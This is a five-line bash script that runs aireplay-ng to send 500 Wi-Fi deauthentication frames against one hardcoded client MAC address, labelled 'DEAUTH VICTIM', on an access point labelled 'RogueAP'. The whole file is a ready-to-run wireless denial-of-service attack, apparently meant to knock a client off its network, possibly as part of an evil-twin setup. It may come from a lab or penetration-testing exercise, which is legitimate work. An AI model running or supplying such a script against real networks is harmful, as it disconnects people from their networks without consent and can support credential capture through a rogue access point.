#!/bin/bash
macaddr="1C:23:2C:B7:D0:29" #ACCESSPOINT (RogueAP)
cliaddr="68:9A:87:58:A3:60" #DEAUTH VICTIM
aireplay-ng -0 500 -a $macaddr -c $cliaddr wlan0mon
sleep 5
